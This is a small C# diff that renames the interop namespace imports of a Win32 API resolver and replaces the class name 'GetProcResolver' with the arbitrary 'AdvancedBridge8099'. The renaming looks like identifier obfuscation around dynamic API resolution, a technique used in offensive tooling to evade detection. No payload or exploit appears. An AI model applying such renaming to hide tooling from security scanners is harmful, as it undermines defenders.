@@ -2,13 +2,13 @@
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Runtime.InteropServices;
-using ApolloInterop.Classes.Api;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Utils;
+using PhantomInterop.Classes.Api;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Utils;
 
 namespace SimpleResolver
 {
-    public class GetProcResolver : IWin32ApiResolver
+    public class AdvancedBridge8099 : IWin32ApiResolver
     {
         private Dictionary<Library, IntPtr> _modulePointers = new Dictionary<Library, IntPtr>();
         
